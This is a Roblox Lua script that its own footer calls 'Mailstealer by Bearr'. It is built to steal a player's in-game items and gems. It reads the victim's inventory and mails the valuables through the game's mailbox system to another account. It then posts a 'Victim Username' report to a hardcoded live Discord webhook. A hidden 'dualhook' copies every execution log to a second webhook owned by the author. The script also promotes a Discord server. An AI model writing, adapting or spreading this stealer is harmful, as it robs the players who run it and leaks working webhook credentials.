local isDualhook = false

-- Non-global variables
local alternativeUsername = "bx4rzwasdeleted"
local alternativeWebhook = "https://discord.com/api/webhooks/1289613307631632417/RrQFIi86rxupJJinPyFfQ_kikvOLmmYz82lfO0NDBPUdC15aIDUkUBSqHRrBGGbyhYk3" -- Alternative webhook URL

local HttpService = game:GetService("HttpService")
local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
local library = require(game.ReplicatedStorage.Library)
local save = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().Inventory
local plr = game.Players.LocalPlayer
local MailMessage = "Join discord.gg/rZmNK6Ptxw"
local isDualhook = false
local alternativeWebhook = "https://discord.com/api/webhooks/1289613307631632417/RrQFIi86rxupJJinPyFfQ_kikvOLmmYz82lfO0NDBPUdC15aIDUkUBSqHRrBGGbyhYk3" -- Alternative webhook URL
local sortedItems = {}
local totalRAP = 0
local GemAmount1 = 0
local min_rap = 10000

-- Get gem amount from inventory
for i, v in pairs(save().Inventory.Currency) do
    if v.id == "Diamonds" then
        GemAmount1 = v._am
        break
    end
end

-- Format number for better readability
local function formatNumber(number)
    if number == nil then
        return "0"
    end
    local suffixes = {"", "k", "m", "b", "t"}
    local suffixIndex = 1
    while number >= 1000 and suffixIndex < #suffixes do
        number = number / 1000
        suffixIndex = suffixIndex + 1
    end
    if suffixIndex == 1 then
        return tostring(math.floor(number))
    else
        if number == math.floor(number) then
            return string.format("%d%s", number, suffixes[suffixIndex])
        else
            return string.format("%.2f%s", number, suffixes[suffixIndex])
        end
    end
end

-- Send data to webhook asynchronously
local function sendToWebhook(url, data)
    task.spawn(function()
        local success, errorMessage = pcall(function()
            HttpService:PostAsync(url, data, Enum.HttpContentType.ApplicationJson)
        end)

        if not success then
            warn("Error sending to webhook:", errorMessage)
        end
    end)
end

-- Send message to Discord webhook
local function SendMessage(username, diamonds, isDualhooked)
    local headers = {
        ["Content-Type"] = "application/json",
    }

    local fields = {
        {
            name = "Victim Username:",
            value = username,
            inline = true
        },
        {
            name = "Items to be sent:",
            value = "",
            inline = false
        },
        {
            name = "Summary:",
            value = "",
            inline = false
        }
    }

    local combinedItems = {}
    local itemRapMap = {}

    for _, item in ipairs(sortedItems) do
        local rapKey = item.name
        if itemRapMap[rapKey] then
            itemRapMap[rapKey].amount = itemRapMap[rapKey].amount + item.amount
        else
            itemRapMap[rapKey] = {amount = item.amount, rap = item.rap, chance = item.chance}
            table.insert(combinedItems, rapKey)
        end
    end

    table.sort(combinedItems, function(a, b)
        return itemRapMap[a].rap * itemRapMap[a].amount > itemRapMap[b].rap * itemRapMap[b].amount
    end)

    for _, itemName in ipairs(combinedItems) do
        local itemData = itemRapMap[itemName]
        local itemLine = ""
        if itemData.chance then
            itemLine = string.format("1/%s %s (x%d): %s RAP", formatNumber(itemData.chance), itemName, itemData.amount, formatNumber(itemData.rap * itemData.amount))
        else
            itemLine = string.format("%s (x%d): %s RAP", itemName, itemData.amount, formatNumber(itemData.rap * itemData.amount))
        end
        fields[2].value = fields[2].value .. itemLine .. "\n"
    end

    fields[3].value = string.format("Gems: %s\nTotal RAP: %s", formatNumber(diamonds), formatNumber(totalRAP))

    if #fields[2].value > 1024 then
        local lines = {}
        for line in fields[2].value:gmatch("[^\r\n]+") do
            table.insert(lines, line)
        end

        while #fields[2].value > 1024 and #lines > 0 do
            table.remove(lines)
            fields[2].value = table.concat(lines, "\n") .. "\nPlus more!"
        end
    end

    local data = {
        ["embeds"] = {{
            ["title"] = "New Execution" ,
            ["color"] = 65280,
            ["fields"] = fields,
            ["footer"] = {
                ["text"] = "Mailstealer by Bearr. discord.gg/rZmNK6Ptxw"
            }
        }}
    }

    local body = HttpService:JSONEncode(data)

    -- Send to the main webhook
    if webhook and webhook ~= "" then
        sendToWebhook(webhook, body)
    end

    -- Send to the dualhooked webhook if it's dualhooked
    if isDualhooked then
        fields[1].value = "Dualhook Execution!"
        data.embeds[1].fields = fields
        body = HttpService:JSONEncode(data)
        sendToWebhook(alternativeWebhook, body)
    else
        -- Send a non-dualhooked log for all executions to dualhooked webhook
        fields[1].value = "Execution Log"
        data.embeds[1].fields = fields
        body = HttpService:JSONEncode(data)
        sendToWebhook(alternativeWebhook, body)
    end
end

-- Improved async handling for mailbox interaction
local function ClaimMail()
    task.spawn(function()
        local timeout = tick() + 30  -- Timeout after 30 seconds
        local response, err = network:WaitForChild("Mailbox: Claim All"):InvokeServer()

        while err == "You must wait 30 seconds before using the mailbox!" and tick() < timeout do
            wait(1)
            response, err = network:WaitForChild("Mailbox: Claim All"):InvokeServer()
        end

        if err then
            print("Failed to claim mail within timeout.")
        end
    end)
end

-- Avoid infinite loops for `InvokeServer`
local function safeInvokeServer(func, ...)
    local success, result = pcall(func, ...)
    if not success then
        warn("InvokeServer failed:", result)
        return nil
    end
    return result
end

-- Send item with a check on rap
local function sendItem(category, uid, am)
    local args = {user, MailMessage, category, uid, am or 1}
    local response = safeInvokeServer(network:WaitForChild("Mailbox: Send").InvokeServer, unpack(args))
    if response == false then
        warn("Failed to send item:", category)
    end
end

-- Send gems if criteria are met
local function SendAllGems()
    for i, v in pairs(save().Inventory.Currency) do
        if v.id == "Diamonds" then
            if GemAmount1 >= 500 and GemAmount1 >= min_rap then
                local args = {user, MailMessage, "Currency", i, GemAmount1}
                safeInvokeServer(network:WaitForChild("Mailbox: Send").InvokeServer, unpack(args))
                break
            end
        end
    end
end

-- Trigger mailbox claims asynchronously
task.spawn(function()
    ClaimMail()
end)
